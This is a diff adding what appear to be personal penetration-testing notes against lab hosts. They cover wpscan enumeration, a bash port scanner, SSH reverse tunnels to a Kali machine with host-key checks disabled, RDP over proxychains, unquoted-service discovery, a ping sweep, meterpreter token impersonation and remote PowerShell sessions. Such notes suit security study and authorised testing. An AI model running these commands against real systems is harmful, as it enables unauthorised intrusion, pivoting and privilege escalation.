@@ -1,0 +1,102 @@
+
+
+wordpress is full of vulns, to find wordpress web vulns we use wpscan tool :
+
+	wpscan --url tshoot.com --enumerate ap,at,cb,dbe
+							;ap: all plugin
+							;at: all themes
+							;cb: config backups
+							;dbe: DB export
+
+===================================================================================================================
+
+bash script that do the nmap scan:
+
+#!/bin/bash
+host=<ip>
+for port in {1..65535}; do
+	timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
+		echo "port $port is open"
+done
+echo "Done"
+
+===================================================================================================================
+
+ssh -R 1122:192.168.64.147:22 -R 13306:192.168.64.147:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" kali@192.168.64.134
+
+	UserKnownHostsFile=/dev/null  : prevent ssh from save the host key
+	StrictHostKeyChecking=no  : instruct ssh to not promot us to accept the key
+
+
+===================================================================================================================
+
+xfreerdp is tool for remote desktop connection, here is its usage with proxychain:
+
+	proxychains xfreerdp /d:sandbox /u:admin /v:192.168.64.147 +clipboard
+
+===================================================================================================================
+
+findstr is like grep in linux, /i flag to search insensitve letter case, /v to ignore the string, for example, to find all auto running services outside of windows folder we write:
+
+	wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
+
+this command also show unqouted services
+
+===================================================================================================================
+
+on linear to ping all the network using cmd:
+
+	> for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.64.%i > nul && echo 192.168.64.%i is up.
+
+===================================================================================================================
+
+privilege escalation with meterpreter shell:
+
+	use incognito
+	
+	list_tokens -u
+
+	impersonate_token tshoot\\administrator
+
+
+===================================================================================================================
+
+Invoke commands to another computer on the network using cmd if we have administrator privileges on it:
+
+	$dcsesh = New-PSSession
+
+	Invoke-command -Session $dcsesh -ScriptBlock {whoami}
+
+
+
+===================================================================================================================
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
